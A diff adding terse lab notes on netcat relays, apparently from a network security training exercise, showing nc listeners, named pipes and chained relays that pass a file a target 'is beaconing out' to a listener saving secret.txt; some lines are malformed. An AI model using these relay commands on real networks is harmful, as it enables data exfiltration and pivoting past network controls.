@@ -1,3 +1,26 @@
+RELAY 1 - 2 ( the target is beaconing out the file )
+nc -lvp 3333 > secret.txt
+
+middle man
+nc -lvp 1234 < mypipe | nc 10.10.0.40 3333 > mypipe
+
+target beacons out on port 1234
+
+relay 3
+nc < relay ip > 3333 > relay3
+
+relay
+nc <target ip> 6789 < mypipe | nc -lvp 3333 > mypipe
+
+
+
+
+
+
+
+
+
+
 NETCAT Relay Demos Listener - Listener
 
 On Blue_Host-1 Relay: $ mknod mypipe p $ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
